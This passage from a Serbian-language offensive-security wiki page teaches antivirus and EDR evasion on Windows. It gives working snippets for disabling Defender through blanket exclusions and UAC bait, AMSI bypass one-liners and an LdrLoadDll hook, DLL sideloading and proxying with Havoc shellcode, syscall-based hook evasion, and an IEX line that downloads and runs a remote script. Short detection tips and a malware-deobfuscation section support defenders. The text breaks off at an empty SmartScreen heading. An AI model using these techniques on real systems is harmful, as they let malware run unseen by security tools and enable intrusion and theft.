# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Ovu stranicu je prvobitno napisao** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Stop Defender

- [defendnot](https://github.com/es3n1n/defendnot): Alat za zaustavljanje Windows Defendera da radi.
- [no-defender](https://github.com/es3n1n/no-defender): Alat za zaustavljanje Windows Defendera da radi, uz lažno predstavljanje kao drugi AV.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

### Installer-style UAC bait before tampering with Defender

Javno dostupni loaderi koji se maskiraju kao game cheats često se isporučuju kao nepotpisani Node.js/Nexe instaleri koji prvo **traže od korisnika elevaciju** i tek onda onesposobe Defender. Tok je jednostavan:

1. Proveri da li postoji administratorski kontekst pomoću `net session`. Komanda uspeva samo kada pozivalac ima admin prava, pa neuspeh znači da loader radi kao standardni korisnik.
2. Odmah ponovo pokrene sam sebe sa `RunAs` verbom da bi pokrenuo očekivani UAC consent prompt uz očuvanje originalne command line.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Žrtve već veruju da instaliraju “cracked” softver, pa se prompt obično prihvata, čime malware dobija prava koja su mu potrebna da promeni Defender politiku.

### Blanket `MpPreference` exclusions for every drive letter

Jednom kada se dobije elevated privilegija, GachiLoader-style chains maksimalno povećavaju Defender blind spots umesto da potpuno isključe servis. Loader prvo ubija GUI watchdog (`taskkill /F /IM SecHealthUI.exe`) a zatim postavlja **ekstremno široke exclusions** tako da svaki user profile, system directory i removable disk postane neproverljiv:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Ključna zapažanja:

- Petlja prolazi kroz svaki montiran filesystem (D:\, E:\, USB stikove, itd.), tako da se **svaki budući payload bačen bilo gde na disku ignoriše**.
- Isključenje za ekstenziju `.sys` je unapred pripremljeno — napadači zadržavaju opciju da kasnije učitaju unsigned drivere bez ponovnog diranja Defendera.
- Sve izmene završavaju pod `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, što kasnijim fazama omogućava da potvrde da isključenja opstaju ili da ih prošire bez ponovnog okidanja UAC-a.

Pošto nijedna Defender usluga nije zaustavljena, naivni health check-ovi i dalje prijavljuju “antivirus active”, iako real-time inspection nikada ne dodiruje te putanje.

## **AV Evasion Methodology**

Trenutno, AV-ovi koriste različite metode za proveru da li je fajl maliciozan ili ne, static detection, dynamic analysis, a za naprednije EDR-ove i behavioural analysis.

### **Static detection**

Static detection se postiže označavanjem poznatih malicioznih stringova ili nizova bajtova u binaru ili skripti, kao i izvlačenjem informacija iz samog fajla (npr. file description, company name, digital signatures, icon, checksum, itd.). To znači da korišćenje poznatih javnih alata može lakše dovesti do hvatanja, jer su verovatno već analizirani i označeni kao maliciozni. Postoji nekoliko načina da se zaobiđe ovakav tip detekcije:

- **Encryption**

Ako enkriptuješ binar, AV neće imati način da detektuje tvoj program, ali će ti trebati neki loader da dekriptuje i pokrene program u memoriji.

- **Obfuscation**

Ponekad je dovoljno samo da promeniš neke stringove u svom binaru ili skripti da bi prošao AV, ali to može biti vremenski zahtevan posao u zavisnosti od toga šta pokušavaš da obfuscate-uješ.

- **Custom tooling**

Ako razviješ sopstvene alate, neće postojati poznate loše signature, ali to zahteva mnogo vremena i truda.

> [!TIP]
> Dobar način da proveriš Windows Defender static detection je [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). On u suštini deli fajl na više segmenata i zatim nalaže Defenderu da skenira svaki pojedinačno, pa ti na taj način može tačno reći koji su označeni stringovi ili bajtovi u tvom binaru.

Toplo preporučujem da pogledaš ovu [YouTube playlistu](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) o praktičnom AV Evasion-u.

### **Dynamic analysis**

Dynamic analysis je kada AV pokrene tvoj binar u sandbox-u i prati malicioznu aktivnost (npr. pokušaj dekriptovanja i čitanja lozinki iz browsera, pravljenje minidump-a nad LSASS-om, itd.). Ovaj deo može biti malo teži za rad, ali evo nekoliko stvari koje možeš da uradiš da bi izbegao sandbox-ove.

- **Sleep before execution** U zavisnosti od toga kako je implementirano, ovo može biti odličan način za zaobilaženje AV dynamic analysis-a. AV-ovi imaju veoma malo vremena da skeniraju fajlove kako ne bi ometali korisnikov workflow, pa dugi sleep-ovi mogu poremetiti analizu binara. Problem je što mnogi AV sandbox-ovi mogu jednostavno da preskoče sleep u zavisnosti od implementacije.
- **Checking machine's resources** Obično sandbox-ovi imaju vrlo malo resursa na raspolaganju (npr. < 2GB RAM), inače bi mogli da uspore korisnikovu mašinu. Ovde možeš biti veoma kreativan, na primer proverom CPU temperature ili čak brzine ventilatora — neće sve biti implementirano u sandbox-u.
- **Machine-specific checks** Ako želiš da ciljaš korisnika čija je workstation priključena na domen "contoso.local", možeš da uradiš proveru domena računara da vidiš da li odgovara onom koji si naveo; ako ne odgovara, možeš naterati svoj program da izađe.

Ispostavlja se da je computername Microsoft Defender Sandbox-a HAL9TH, pa možeš proveriti ime računara u svom malware-u pre detonation-a; ako se ime poklapa sa HAL9TH, to znači da si unutar Defender sandbox-a, pa možeš naterati program da izađe.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Još neki veoma dobri saveti od [@mgeeky](https://twitter.com/mariuszbit) za rad protiv Sandbox-ova

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev kanal</p></figcaption></figure>

Kao što smo ranije rekli u ovom postu, **public tools** će na kraju **biti detektovani**, pa bi trebalo da se zapitaš nešto:

Na primer, ako želiš da dump-uješ LSASS, **da li ti zaista treba mimikatz**? Ili možeš da koristiš drugi projekat koji je manje poznat i takođe dump-uje LSASS.

Pravi odgovor je verovatno ovo drugo. Uzimajući mimikatz kao primer, on je verovatno jedan od, ako ne i najviše flagovanih komada malware-a od strane AV-ova i EDR-ova; dok je sam projekat super kul, takođe je noćna mora raditi s njim da bi se zaobišli AV-ovi, pa samo potraži alternative za ono što pokušavaš da postigneš.

> [!TIP]
> Kada modifikuješ svoje payload-ove radi evasion-a, obavezno **isključi automatic sample submission** u Defender-u, i molim te, ozbiljno, **NE UPLOADUJ NA VIRUSTOTAL** ako ti je cilj da dugoročno postigneš evasion. Ako želiš da proveriš da li tvoj payload detektuje neki konkretan AV, instaliraj ga na VM, pokušaj da isključiš automatic sample submission i testiraj tamo dok ne budeš zadovoljan rezultatom.

## EXEs vs DLLs

Kad god je moguće, uvek **prioritizuj korišćenje DLL-ova za evasion**; iz mog iskustva, DLL fajlovi su obično **mnogo manje detektovani** i analizirani, pa je to veoma jednostavan trik za izbegavanje detekcije u nekim slučajevima (ako tvoj payload, naravno, ima neki način da se pokrene kao DLL).

Kao što možemo videti na ovoj slici, DLL Payload iz Havoc-a ima detection rate od 4/26 na antiscan.me, dok EXE payload ima 7/26 detection rate.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me poređenje normalnog Havoc EXE payload-a i normalnog Havoc DLL-a</p></figcaption></figure>

Sada ćemo pokazati neke trikove koje možeš da koristiš sa DLL fajlovima da budeš mnogo stealthier.

## DLL Sideloading & Proxying

**DLL Sideloading** koristi DLL search order koji koristi loader tako što postavlja i victim application i malicious payload(s) jedan pored drugog.

Možeš proveriti programe podložne DLL Sideloading-u koristeći [Siofra](https://github.com/Cybereason/siofra) i sledeći powershell script:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Ova komanda će ispisati listu programa podložnih DLL hijacking-u unutar "C:\Program Files\\" i DLL fajlove koje pokušavaju da učitaju.

Toplo preporučujem da **sami istražite DLL Hijackable/Sideloadable programe**, ova tehnika je prilično stealthy ako se uradi kako treba, ali ako koristite javno poznate DLL Sideloadable programe, možete biti lako uhvaćeni.

Samo postavljanjem malicious DLL-a sa imenom koje program očekuje da učita, payload neće biti učitan, jer program očekuje neke specifične funkcije unutar tog DLL-a. Da bismo rešili ovaj problem, koristićemo drugu tehniku zvanu **DLL Proxying/Forwarding**.

**DLL Proxying** prosleđuje pozive koje program pravi od proxy (i malicious) DLL-a ka originalnom DLL-u, čime se čuva funkcionalnost programa i omogućava izvršavanje vašeg payload-a.

Koristiću projekat [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) od [@flangvik](https://twitter.com/Flangvik/)

Ovo su koraci koje sam pratio:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Poslednja komanda će nam dati 2 fajla: template izvornog koda DLL-a i originalni preimenovani DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Evo rezultata:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

I naš shellcode (enkodovan sa [SGN](https://github.com/EgeBalci/sgn)) i proxy DLL imaju 0/26 Detection rate na [antiscan.me](https://antiscan.me)! To bih nazvao uspehom.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> **Toplo preporučujem** da pogledate [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) o DLL Sideloading-u, kao i [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) da biste detaljnije naučili više o onome o čemu smo razgovarali.

### Zloupotreba Forwarded Exports (ForwardSideLoading)

Windows PE moduli mogu da izvoze funkcije koje su zapravo "forwarders": umesto da pokazuju na kod, export entry sadrži ASCII string oblika `TargetDll.TargetFunc`. Kada pozivalac resolve-uje export, Windows loader će:

- Učitati `TargetDll` ako već nije učitan
- Resolve-ovati `TargetFunc` iz njega

Ključna ponašanja koja treba razumeti:
- Ako je `TargetDll` KnownDLL, dobija se iz zaštićenog KnownDLLs namespace-a (npr. ntdll, kernelbase, ole32).
- Ako `TargetDll` nije KnownDLL, koristi se normalan DLL search order, koji uključuje direktorijum modula koji radi forward resolution.

Ovo omogućava indirektni sideloading primitive: pronađite potpisani DLL koji eksportuje funkciju forwarded na naziv modula koji nije KnownDLL, zatim postavite taj potpisani DLL zajedno sa DLL-om pod napadačkom kontrolom, nazvanim tačno kao forwarded target module. Kada se pozove forwarded export, loader resolve-uje forward i učitava vaš DLL iz istog direktorijuma, izvršavajući vaš DllMain.

Primer primećen na Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` nije KnownDLL, pa se razrešava kroz normalan redosled pretrage.

PoC (copy-paste):
1) Kopirajte potpisani sistemski DLL u upisivi folder
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Postavite maliciozni `NCRYPTPROV.dll` u isti folder. Minimalni DllMain je dovoljan za izvršavanje koda; ne morate da implementirate prosleđenu funkciju da biste pokrenuli DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Pokreni forward pomoću potpisanog LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Primećeno ponašanje:
- rundll32 (potpisan) učitava side-by-side `keyiso.dll` (potpisan)
- Tokom rešavanja `KeyIsoSetAuditingInterface`, loader prati forward na `NCRYPTPROV.SetAuditingInterface`
- Loader zatim učitava `NCRYPTPROV.dll` iz `C:\test` i izvršava njegov `DllMain`
- Ako `SetAuditingInterface` nije implementiran, dobićete grešku "missing API" tek nakon što je `DllMain` već pokrenut

Saveti za hunting:
- Fokusirajte se na forwarded exports gde target modul nije KnownDLL. KnownDLLs su navedeni pod `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Možete enumerisati forwarded exports pomoću alata kao što su:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Pogledajte Windows 11 forwarder inventory da biste potražili kandidate: https://hexacorn.com/d/apis_fwd.txt

Ideje za detekciju/odbranu:
- Pratite LOLBins (npr. rundll32.exe) koji učitavaju potpisane DLL-ove iz path-ova koji nisu sistemski, a zatim učitavaju non-KnownDLLs sa istim osnovnim imenom iz tog direktorijuma
- Alarmirajte na lanace procesa/modula poput: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` pod path-ovima u koje korisnik može da upisuje
- Primenite politike integriteta koda (WDAC/AppLocker) i zabranite write+execute u direktorijumima aplikacija

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Možete koristiti Freeze da učitate i izvršite svoj shellcode na stealthy način.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion je samo igra mačke i miša, ono što radi danas može biti detektovano sutra, zato se nikada nemoj oslanjati samo na jedan alat, ako je moguće, pokušaj da povežeš više evasion tehnika.

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

EDR-ovi često postavljaju **user-mode inline hooks** na `ntdll.dll` syscall stub-ove. Da bi zaobišao te hook-ove, možeš da generišeš **direct** ili **indirect** syscall stub-ove koji učitavaju tačan **SSN** (System Service Number) i prelaze u kernel mode bez izvršavanja hook-ovanog export entrypoint-a.

**Opcije poziva:**
- **Direct (embedded)**: ubaci `syscall`/`sysenter`/`SVC #0` instrukciju u generisani stub (nema `ntdll` export hit-a).
- **Indirect**: skoči u postojeći `syscall` gadget unutar `ntdll` tako da izgleda kao da kernel tranzicija potiče iz `ntdll` (korisno za heurističko izbegavanje); **randomized indirect** bira gadget iz pool-a za svaki poziv.
- **Egg-hunt**: izbegavaj da na disku ugrađuješ statički `0F 05` opcode sequence; rešavaj syscall sequence u runtime-u.

**Strategije za SSN resolution otporne na hook-ove:**
- **FreshyCalls (VA sort)**: izvedi SSN-ove sortiranjem syscall stub-ova po virtual address umesto čitanjem byte-ova stub-a.
- **SyscallsFromDisk**: mapiraj čist `\KnownDlls\ntdll.dll`, pročitaj SSN-ove iz njegovog `.text`, pa ga unmap-uj (zaobilazi sve in-memory hook-ove).
- **RecycledGate**: kombinuje VA-sorted SSN inference sa validacijom opcode-a kada je stub čist; vraća se na VA inference ako je hook-ovan.
- **HW Breakpoint**: postavi DR0 na `syscall` instrukciju i koristi VEH da uhvatiš SSN iz `EAX` u runtime-u, bez parsiranja hook-ovanih byte-ova.

Primer korišćenja SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI je kreiran da spreči "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". U početku, AV-ovi su mogli da skeniraju samo **fajlove na disku**, pa ako si nekako mogao da izvršiš payload-ove **direktno u memoriji**, AV nije mogao ništa da uradi da to spreči, jer nije imao dovoljno vidljivosti.

AMSI funkcija je integrisana u ove komponente Windows-a.

- User Account Control, ili UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interaktivna upotreba, i dynamic code evaluation)
- Windows Script Host (wscript.exe i cscript.exe)
- JavaScript i VBScript
- Office VBA macros

Ona omogućava antivirus rešenjima da pregledaju ponašanje skripti tako što izlaže sadržaj skripti u obliku koji je i nešifrovan i neobfuskovan.

Pokretanje `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` će proizvesti sledeći alert na Windows Defender-u.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Primeti kako dodaje prefiks `amsi:` i zatim putanju do izvršnog fajla iz kog je skripta pokrenuta, u ovom slučaju, powershell.exe

Nismo spustili nijedan fajl na disk, ali smo ipak uhvaćeni u memoriji zbog AMSI-ja.

Štaviše, počevši od **.NET 4.8**, C# code se takođe izvršava kroz AMSI. Ovo čak utiče na `Assembly.Load(byte[])` za učitavanje izvršavanja u memoriji. Zato se preporučuje korišćenje nižih verzija .NET-a (kao što je 4.7.2 ili niže) za izvršavanje u memoriji ako želiš da izbegneš AMSI.

Postoji nekoliko načina da se zaobiđe AMSI:

- **Obfuscation**

Pošto AMSI uglavnom radi sa static detections, zato modifikovanje skripti koje pokušavaš da učitaš može biti dobar način za evasion.

Međutim, AMSI ima mogućnost da unobfuscating skripte čak i ako imaju više slojeva, tako da obfuscation može biti loša opcija u zavisnosti od toga kako je urađena. Zbog toga nije baš jednostavno izbeći detekciju. Ipak, ponekad je dovoljno samo da promeniš nekoliko naziva varijabli i bićeš u redu, tako da zavisi od toga koliko je nešto već flag-ovano.

- **AMSI Bypass**

Pošto je AMSI implementiran učitavanjem DLL-a u powershell (takođe cscript.exe, wscript.exe, itd.) proces, moguće je lako menjati ga čak i kada radiš kao neprivilegovani user. Zbog ove mane u implementaciji AMSI-ja, istraživači su pronašli više načina da zaobiđu AMSI scanning.

**Forcing an Error**

Forsiranje da AMSI initialization ne uspe (amsiInitFailed) će rezultovati time da nijedno skeniranje neće biti pokrenuto za trenutni proces. Prvobitno je ovo otkrio [Matt Graeber](https://twitter.com/mattifestation), a Microsoft je razvio signature da spreči širu upotrebu.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Sve što je bilo potrebno bila je jedna linija powershell koda da bi se AMSI učinio neupotrebljivim za trenutni powershell proces. Ova linija je, naravno, sama po sebi označena od strane AMSI-ja, tako da je potrebno određeno prilagođavanje da bi se ova tehnika koristila.

Evo modifikovanog AMSI bypass-a koji sam uzeo sa ovog [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Imajte na umu da će ovo verovatno biti flag-ovano čim ovaj post izađe, pa ne bi trebalo da objavljujete bilo kakav code ako vam je plan da ostanete undetected.

**Memory Patching**

Ovu tehniku je prvobitno otkrio [@RastaMouse](https://twitter.com/_RastaMouse/) i ona uključuje pronalaženje adrese za funkciju "AmsiScanBuffer" u amsi.dll (odgovornu za skeniranje inputa koji dostavlja korisnik) i njeno prepisivanje instrukcijama koje vraćaju code za E_INVALIDARG, na ovaj način, rezultat stvarnog scan-a će vratiti 0, što se interpretira kao clean rezultat.

> [!TIP]
> Molimo pročitajte [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) za detaljnije objašnjenje.

Postoje i mnoge druge tehnike koje se koriste za bypass AMSI sa powershell, pogledajte [**ovu stranicu**](basic-powershell-for-pentesters/index.html#amsi-bypass) i [**ovaj repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) da biste saznali više o njima.

### Blokiranje AMSI sprečavanjem učitavanja amsi.dll (LdrLoadDll hook)

AMSI se inicijalizuje tek nakon što se `amsi.dll` učita u trenutni process. Robustan, language‑agnostic bypass je postavljanje user‑mode hook-a na `ntdll!LdrLoadDll` koji vraća grešku kada je traženi module `amsi.dll`. Kao rezultat, AMSI se nikada ne učitava i za taj process se ne izvršavaju skeniranja.

Implementacioni pregled (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notes
- Radi across PowerShell, WScript/CScript i custom loader-e podjednako (sve što bi inače učitalo AMSI).
- Upari sa slanjem skripti preko stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) da izbegneš dugačke command-line artefakte.
- Viđeno u upotrebi od strane loader-a izvršenih kroz LOLBins (npr. `regsvr32` poziva `DllRegisterServer`).

Alat **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** takođe generiše skriptu za bypass AMSI.
Alat **[https://amsibypass.com/](https://amsibypass.com/)** takođe generiše skriptu za bypass AMSI koja izbegava signature koristeći randomizovanu user-defined function, variables, characters expression i primenjuje nasumično menjanje velikih/malih slova na PowerShell ključne reči da bi izbegla signature.

**Remove the detected signature**

Možeš koristiti alat kao što je **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** i **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** da ukloniš detektovani AMSI signature iz memorije trenutnog procesa. Ovaj alat radi tako što skenira memoriju trenutnog procesa u potrazi za AMSI signature-om i zatim ga prepisuje NOP instrukcijama, efektivno ga uklanjajući iz memorije.

**AV/EDR products that uses AMSI**

Možeš pronaći listu AV/EDR proizvoda koji koriste AMSI u **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Use Powershell version 2**
Ako koristiš PowerShell verziju 2, AMSI neće biti učitan, pa možeš da pokrećeš skripte bez AMSI skeniranja. Možeš to uraditi:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging je funkcija koja omogućava da beležite sve PowerShell komande izvršene na sistemu. To može biti korisno za potrebe audita i rešavanja problema, ali može biti i **problem za napadače koji žele da izbegnu detekciju**.

Da biste zaobišli PowerShell logging, možete koristiti sledeće tehnike:

- **Onemogućite PowerShell Transcription i Module Logging**: U tu svrhu možete koristiti alat kao što je [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs).
- **Koristite Powershell verziju 2**: Ako koristite PowerShell verziju 2, AMSI neće biti učitan, pa možete pokretati svoje skripte bez skeniranja od strane AMSI-ja. Možete to uraditi ovako: `powershell.exe -version 2`
- **Koristite Unmanaged Powershell Session**: Koristite [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) da pokrenete powershell bez zaštita (ovo je ono što `powerpick` iz Cobal Strike koristi).


## Obfuscation

> [!TIP]
> Nekoliko obfuscation tehnika se oslanja na enkripciju podataka, što će povećati entropiju binarne datoteke i učiniti je lakšom za AV i EDR da je detektuju. Budite oprezni sa ovim i možda primenjujte enkripciju samo na određene delove koda koji su osetljivi ili koje treba sakriti.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Prilikom analize malware-a koji koristi ConfuserEx 2 (ili komercijalne forkove), uobičajeno je naići na nekoliko slojeva zaštite koji će blokirati dekompajlere i sandbox-ove. Sledeći workflow pouzdano **obnavlja skoro originalni IL** koji se zatim može dekompajlirati u C# u alatima kao što su dnSpy ili ILSpy.

1.  Uklanjanje anti-tampering zaštite – ConfuserEx enkriptuje svako *method body* i dekriptuje ga unutar statičkog konstruktora *module* (`<Module>.cctor`). Ovo takođe zakrpljuje PE checksum, pa će svaka modifikacija srušiti binarnu datoteku. Koristite **AntiTamperKiller** da locirate enkriptovane metadata tabele, oporavite XOR ključeve i prepišete čistu assembly:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Izlaz sadrži 6 anti-tamper parametara (`key0-key3`, `nameHash`, `internKey`) koji mogu biti korisni kada pravite sopstveni unpacker.

2.  Oporavak simbola / control-flow-a – prosledite *clean* fajl u **de4dot-cex** (fork de4dot-a koji je svestan ConfuserEx-a).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – izaberite ConfuserEx 2 profil
• de4dot će poništiti control-flow flattening, vratiti originalne namespaces, klase i imena varijabli i dešifrovati konstantne stringove.

3.  Uklanjanje proxy-call-ova – ConfuserEx zamenjuje direktne pozive metoda laganim wrapper-ima (a.k.a *proxy calls*) da bi dodatno otežao dekompilaciju. Uklonite ih pomoću **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Nakon ovog koraka trebalo bi da vidite normalne .NET API-je kao što su `Convert.FromBase64String` ili `AES.Create()` umesto neprozirnih wrapper funkcija (`Class8.smethod_10`, …).

4.  Ručno čišćenje – pokrenite dobijenu binarnu datoteku u dnSpy, pretražite velike Base64 blob-ove ili upotrebu `RijndaelManaged`/`TripleDESCryptoServiceProvider` da biste locirali *pravi* payload. Često malware čuva payload kao TLV-enkodovani byte array inicijalizovan unutar `<Module>.byte_0`.

Gornji lanac obnavlja execution flow **bez** potrebe da pokrećete maliciozni uzorak – korisno kada radite na offline radnoj stanici.

> 🛈  ConfuserEx proizvodi prilagođeni atribut nazvan `ConfusedByAttribute` koji može da se koristi kao IOC za automatsko sortiranje uzoraka.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Cilj ovog projekta je da obezbedi open-source fork [LLVM](http://www.llvm.org/) compilation suite-a koji može da pruži veću bezbednost softvera kroz [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) i tamper-proofing.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstriše kako da se koristi `C++11/14` jezik za generisanje, u vreme kompajliranja, obfuskovanog koda bez korišćenja bilo kog eksternog alata i bez modifikovanja kompajlera.
- [**obfy**](https://github.com/fritzone/obfy): Dodaje sloj obfuskovanih operacija generisanih pomoću C++ template metaprogramming framework-a, što će malo otežati život osobi koja želi da crack-uje aplikaciju.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz je x64 binary obfuscator koji može da obfuskira razne različite pe fajlove uključujući: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame je jednostavan metamorphic code engine za proizvoljne executables.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator je framework za fine-grained code obfuscation za jezike koje podržava LLVM, koristeći ROP (return-oriented programming). ROPfuscator obfuskira program na nivou assembly code-a transformišući regularne instrukcije u ROP chains, osujećujući našu prirodnu predstavu normalnog control flow-a.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt je .NET PE Crypter napisan u Nimu
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor može da konvertuje postojeće EXE/DLL u shellcode i zatim ih učita

## SmartScreen & MoTW

